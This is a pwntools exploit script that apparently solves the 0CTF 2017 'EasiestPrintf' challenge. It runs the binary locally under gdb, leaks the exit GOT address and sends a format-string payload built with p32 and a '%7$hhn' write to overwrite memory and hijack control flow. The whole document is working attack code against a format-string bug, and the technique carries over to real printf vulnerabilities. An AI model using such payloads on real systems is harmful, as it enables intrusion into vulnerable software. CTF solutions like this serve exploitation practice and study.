from pwn import *
context(log_level = "debug")

p = process("./EasiestPrintf",env={"LD_LIBRARY_PATH":"/root/Desktop/ctf_task/0ctf2017/pwn1"})

main_addr = 0x0804882e
exit_plt = 0x08049FCC
exit_got = 0x08049FE4
bbs_addr = 0x0804A020

p.recvuntil("s you wanna read:\n")
gdb.attach(p,"b*0x0804881C\nb*0x8048821\nc")
p.sendline(str(exit_got))
p.recvline()
p.recvuntil("Good Bye\n")

payload = p32(bbs_addr)+"%%%dc"%(0x2e-4)+"%7$hhn"
p.sendline(payload)

p.interactive()